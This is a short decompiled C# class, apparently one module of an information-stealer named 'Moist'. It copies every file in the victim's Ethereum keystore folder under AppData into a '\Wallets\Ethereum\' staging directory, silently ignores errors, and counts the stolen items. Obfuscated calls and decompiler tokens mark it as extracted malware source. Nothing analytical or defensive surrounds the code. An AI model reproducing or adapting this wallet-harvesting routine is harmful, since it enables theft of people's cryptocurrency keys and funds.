using System;
using System.IO;
using Moist;

// Token: 0x0200005F RID: 95
internal class Class32
{
	// Token: 0x06000252 RID: 594 RVA: 0x00012D44 File Offset: 0x00010F44
	public static void smethod_0(string string_1)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\Ethereum\\keystore").GetFiles())
			{
				Directory.CreateDirectory(string_1 + Class32.string_0);
				fileInfo.CopyTo(string_1 + Class32.string_0 + fileInfo.Name);
			}
			Class32.int_0++;
			Class37.int_0++;
		}
		catch
		{
		}
	}

	// Token: 0x06000253 RID: 595 RVA: 0x0000446C File Offset: 0x0000266C
	public Class32()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x06000254 RID: 596 RVA: 0x0000529F File Offset: 0x0000349F
	// Note: this type is marked as 'beforefieldinit'.
	static Class32()
	{
		Class40.gcO0h7LzslQIW();
		Class32.int_0 = 0;
		Class32.string_0 = "\\Wallets\\Ethereum\\";
	}

	// Token: 0x0400010E RID: 270
	public static int int_0;

	// Token: 0x0400010F RID: 271
	public static string string_0;
}
